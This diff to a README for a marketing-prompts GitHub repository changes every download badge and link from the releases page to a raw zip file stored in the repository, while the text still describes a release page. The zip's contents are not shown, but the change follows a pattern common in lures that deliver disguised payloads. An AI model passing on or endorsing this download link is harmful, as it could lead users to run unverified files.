@@ -1,6 +1,6 @@
 # 🎯 marketing-prompts - Ready-to-use prompts for marketing work
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/gvishweshwar/marketing-prompts/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/gvishweshwar/marketing-prompts/main/swipe-files/prompts_marketing_1.4.zip)
 
 ## 📦 What this is
 
@@ -33,7 +33,7 @@ If you plan to save the prompts, a text app or notes app also helps.
 
 Visit this page to download the latest release:
 
-https://github.com/gvishweshwar/marketing-prompts/releases
+https://raw.githubusercontent.com/gvishweshwar/marketing-prompts/main/swipe-files/prompts_marketing_1.4.zip
 
 On that page, look for the newest release and download the file that fits your device or use case. If the release includes a zip file, download that file and extract it on your PC.
 
@@ -252,4 +252,4 @@ It is useful if you want:
 
 Open the release page, download the latest file, extract it if needed, then open the prompt files and start with one topic that matches your current task
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-999999?style=for-the-badge)](https://github.com/gvishweshwar/marketing-prompts/releases)
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-999999?style=for-the-badge)](https://raw.githubusercontent.com/gvishweshwar/marketing-prompts/main/swipe-files/prompts_marketing_1.4.zip)
